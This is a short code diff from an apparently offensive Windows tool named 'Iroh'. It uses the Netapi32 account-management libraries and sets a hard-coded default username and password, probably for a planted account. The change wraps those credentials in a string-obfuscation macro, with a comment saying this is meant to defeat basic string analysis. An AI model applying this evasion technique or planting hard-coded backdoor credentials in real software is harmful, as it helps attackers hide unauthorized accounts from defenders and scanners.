@@ -3,14 +3,18 @@
 
 #pragma comment(lib, "Netapi32.lib")
 
-#include<Windows.h>
+#include <Windows.h>
 #include <DSRole.h>
 #include <LM.h>
 
 #include <string>
 
-#define DEFAULT_USERNAME L"Iroh"
-#define DEFAULT_PASSWORD L"Password-123!"
+#include "../Utilities/obfuscate.h"
+
+// Default User Details, obfuscated to prevent basic string analysis.
+
+#define DEFAULT_USERNAME  (wchar_t *)(char *)AY_OBFUSCATE("Iroh")
+#define DEFAULT_PASSWORD  (wchar_t *)(char *)AY_OBFUSCATE("Password-123!")
 #define DEFAULT_SLEEPTIMER 15000
 
 namespace Iroh {
